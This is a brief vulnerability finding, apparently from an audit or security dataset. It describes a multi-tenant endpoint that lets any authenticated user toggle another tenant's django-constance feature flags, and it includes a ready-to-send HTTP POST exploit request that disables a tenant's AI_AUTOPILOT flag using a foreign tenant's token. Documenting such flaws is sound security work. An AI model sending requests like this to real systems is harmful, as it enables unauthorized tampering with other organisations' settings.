diagnosis: The endpoint allows any authenticated user to toggle runtime feature flags in django-constance for tenant_slug. It does not verify that request.user belongs to or holds administrative rights in the specified tenant.
exploit_request:
POST /api/tenants/target_enterprise/flags/ HTTP/1.1
Host: admin.saasplatform.com
Authorization: Bearer <unauthorized_tenant_jwt>
Content-Type: application/json

{"feature_flag": "AI_AUTOPILOT", "enabled": false}
